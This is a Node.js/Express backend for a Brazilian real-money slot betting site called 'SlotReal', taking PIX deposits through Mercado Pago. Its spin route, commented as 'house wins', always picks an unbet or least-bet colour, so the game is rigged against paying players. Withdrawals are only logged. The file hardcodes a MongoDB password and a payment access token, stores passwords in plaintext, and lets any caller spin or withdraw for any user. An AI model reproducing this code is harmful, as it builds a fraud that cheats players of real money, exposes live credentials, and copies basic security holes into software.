const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
const { MercadoPagoConfig, Payment } = require('mercadopago');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// CONEXÃO BANCO DE DADOS
const MONGO_URI = "mongodb+srv://SlotReal:A1l9a9n7@cluster0.ap7q4ev.mongodb.net/SlotGame?retryWrites=true&w=majority";
mongoose.connect(MONGO_URI).then(() => console.log("✅ BANCO CONECTADO"));

const User = mongoose.model('User', new mongoose.Schema({
    user: { type: String, unique: true },
    pass: String,
    fone: String,
    saldo: { type: Number, default: 0.00 }
}));

// LÓGICA DE DECISÃO DO VENCEDOR (CASA GANHA)
app.post('/api/spin', async (req, res) => {
    try {
        const { user, bets } = req.body;
        const userDb = await User.findOne({ user });
        
        let corAlvo = 0;
        let menorValor = Infinity;
        let coresVazias = [];

        bets.forEach((valor, i) => {
            if (valor === 0) coresVazias.push(i);
            if (valor < menorValor) { menorValor = valor; corAlvo = i; }
        });

        if (coresVazias.length > 0) {
            corAlvo = coresVazias[Math.floor(Math.random() * coresVazias.length)];
        }

        const premio = bets[corAlvo] * 5.0;
        const novoSaldo = Number((userDb.saldo + premio).toFixed(2));
        await User.findOneAndUpdate({ user }, { saldo: novoSaldo });

        res.json({ success: true, corAlvo, novoSaldo, ganhou: premio > 0 });
    } catch (e) { res.status(500).json({ success: false }); }
});

// LOGIN E CADASTRO
app.post('/auth/login', async (req, res) => {
    const { user, pass } = req.body;
    const conta = await User.findOne({ user, pass });
    if (conta) res.json({ success: true, saldo: conta.saldo });
    else res.json({ success: false, message: "Dados incorretos" });
});

app.post('/auth/cadastro', async (req, res) => {
    try {
        const novo = new User({ ...req.body, saldo: 0.00 });
        await novo.save();
        res.json({ success: true, saldo: 0.00 });
    } catch (e) { res.json({ success: false, message: "Usuário já existe" }); }
});

// SAQUE
app.post('/api/saque', async (req, res) => {
    const { user, valor, chave } = req.body;
    const u = await User.findOne({ user });
    if (u.saldo >= valor && valor >= 10) {
        await User.findOneAndUpdate({ user }, { $inc: { saldo: -valor } });
        console.log(`SOLICITAÇÃO DE SAQUE: ${user} - R$${valor} - PIX: ${chave}`);
        res.json({ success: true });
    } else res.json({ success: false, message: "Saldo insuficiente ou valor baixo" });
});

// MERCADO PAGO
const client = new MercadoPagoConfig({ accessToken: 'APP_USR-480319563212549-011210-80973eae502f42ff3dfbc0cb456aa930-485513741' });
const payment = new Payment(client);

app.post('/gerar-pix', async (req, res) => {
    try {
        const result = await payment.create({ body: {
            transaction_amount: parseFloat(req.body.valor),
            description: 'Deposito SlotReal',
            payment_method_id: 'pix',
            external_reference: req.body.userLogado,
            payer: { email: 'contato@slot.com' }
        }});
        res.json({ copia_e_cola: result.point_of_interaction.transaction_data.qr_code, imagem_qr: result.point_of_interaction.transaction_data.qr_code_base64 });
    } catch (e) { res.status(500).json(e); }
});

app.listen(10000, () => console.log("Servidor ON"));
